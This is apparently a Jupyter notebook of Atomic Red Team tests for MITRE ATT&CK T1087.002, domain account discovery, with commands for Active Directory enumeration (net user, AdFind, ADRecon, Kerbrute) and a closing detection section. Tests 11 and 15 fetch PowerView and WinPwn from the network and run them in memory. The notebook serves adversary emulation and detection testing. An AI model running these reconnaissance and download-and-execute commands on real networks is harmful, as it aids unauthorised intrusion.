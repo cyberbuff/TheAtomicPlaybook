{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "851a44e1",
   "metadata": {},
   "source": "# T1087.002 - Domain Account\nAdversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups."
  },
  {
   "cell_type": "markdown",
   "id": "bc9eb277",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "c8619949",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Enumerate all accounts (Domain)",
    "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user /domain\nnet group /domain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e9e23239",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "e80fb397",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Enumerate all accounts via PowerShell (Domain)",
    "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nnet user /domain\nget-localgroupmember -group Users\nget-aduser -filter *\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c8114695",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "2771736a",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Enumerate logged on users via CMD (Domain)",
    "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nquery user /SERVER:%COMPUTERNAME%\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cc65919f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "4b72e1a9",
   "metadata": {},
   "source": "### Atomic Test #4 - Automated AD Recon (ADRecon)\nADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: ADRecon must exist on disk at specified location (#{adrecon_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:TEMP\\ADRecon.ps1) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest -Uri \"https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1\" -OutFile $env:TEMP\\ADRecon.ps1\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30894886",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "48ab1817",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-Expression $env:TEMP\\ADRecon.ps1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8a2a7b9a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "9b503797",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:TEMP\\ADRecon.ps1 -Force -ErrorAction Ignore | Out-Null\nGet-ChildItem $env:TEMP -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b6034e8e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0af681f5",
   "metadata": {},
   "source": "### Atomic Test #5 - Adfind -Listing password policy\nAdfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (#{adfind_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe\" -OutFile PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4d3a0cf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3b3f8419",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nPathToAtomicsFolder\\T1087.002\\src\\AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "214ff471",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "27d8df75",
   "metadata": {},
   "source": "### Atomic Test #6 - Adfind - Enumerate Active Directory Admins\nAdfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (#{adfind_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe\" -OutFile PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7e3a774",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1c33c3e1",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nPathToAtomicsFolder\\T1087.002\\src\\AdFind.exe -sc admincountdmp\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ecca015",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "6f9f83e2",
   "metadata": {},
   "source": "### Atomic Test #7 - Adfind - Enumerate Active Directory User Objects\nAdfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (#{adfind_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe\" -OutFile PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6b43e76f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7cdd2d76",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nPathToAtomicsFolder\\T1087.002\\src\\AdFind.exe -f (objectcategory=person)\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "253ee8f0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "625262a3",
   "metadata": {},
   "source": "### Atomic Test #8 - Adfind - Enumerate Active Directory Exchange AD Objects\nAdfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (#{adfind_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe\" -OutFile PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1b878f92",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "bdb4263a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nPathToAtomicsFolder\\T1087.002\\src\\AdFind.exe -sc exchaddresses\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17844bc9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "01850b54",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Enumerate Default Domain Admin Details (Domain)",
    "This test will enumerate the details of the built-in domain admin account\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user administrator /domain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a023376d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "dd51ca11",
   "metadata": {},
   "source": "### Atomic Test #10 - Enumerate Active Directory for Unconstrained Delegation\nAttackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: PowerShell ActiveDirectory Module must be installed\n\n##### Check Prereq Commands:\n```powershell\nTry {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n\n```\n##### Get Prereq Commands:\n```powershell\nif((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "975e1cbc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4e5a8687",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a64c1e5d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "5ff423b5",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Get-DomainUser with PowerView",
    "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "761df521",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "a4cd4792",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - Enumerate Active Directory Users with ADSISearcher",
    "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f947c190",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "45446325",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Enumerate Linked Policies In ADSISearcher Discovery",
    "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eebdacdc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "3fa3096a",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - Enumerate Root Domain linked policies Discovery",
    "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1fda69d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "c15c0bea",
   "metadata": {},
   "source": [
    "### Atomic Test #15 - WinPwn - generaldomaininfo",
    "Gathers general domain information using the generaldomaininfo function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7161695",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "b5210f34",
   "metadata": {},
   "source": "### Atomic Test #16 - Kerbrute - userenum\nEnumerates active directory usernames using the userenum function of Kerbrute\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: kerbrute.exe must exist in $env:temp.\n\n##### Check Prereq Commands:\n```powershell\nif (test-path $env:temp\\kerbrute.exe){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"$env:TEMP\\kerbrute.exe\"\n\n```\n##### Description: username text file must exist in $env:temp.\n\n##### Check Prereq Commands:\n```powershell\nif (test-path $env:temp\\username.txt){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true\" -outfile \"$env:TEMP\\username.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6a54869",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 16 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4fdfeeb1",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncd $env:temp\n.\\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain $env:TEMP\\username.txt```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c8f7791f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "2339264a",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}